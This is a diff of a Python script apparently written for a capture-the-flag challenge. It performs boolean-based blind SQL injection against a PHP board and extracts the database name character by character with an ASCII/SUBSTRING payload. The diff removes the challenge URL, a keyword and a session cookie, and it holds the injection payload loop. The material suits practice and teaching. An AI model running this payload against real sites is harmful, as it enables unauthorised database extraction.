@@ -1,11 +1,11 @@
 import requests
 
 # 사이트 주소
-url = "http://ctf2.segfaulthub.com:7777/sqli_8/notice_read.php"
+url = ""
 #charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}"
 DB_len = 30
 true_val="username"
-keyword = "dkanrjsk"
+keyword = ""
 
 DB_name = ""
 
@@ -18,7 +18,7 @@ for i in range(1,DB_len+1):  # DB 이름 최대 30자까지
         payload2= f"1=1 and ASCII(BINARY SUBSTRING(DATABASE(),{i},1))={char_code} AND {true_val}"
         
         cookies = {
-            'PHPSESSID' : "d8h9qc4tdp2fdrq148vhectbpe"
+            'PHPSESSID' : ""
         }
 
         # GET 메서드 & 파라미터 설정
@@ -33,7 +33,7 @@ for i in range(1,DB_len+1):  # DB 이름 최대 30자까지
         data = {
             'option_val': payload2,
             'board_result' : "dk",
-            'board_search': "%F0%9F%94%8D",
+            'board_search': "",
             'date_from': "",
             'date_to' : ""
         }
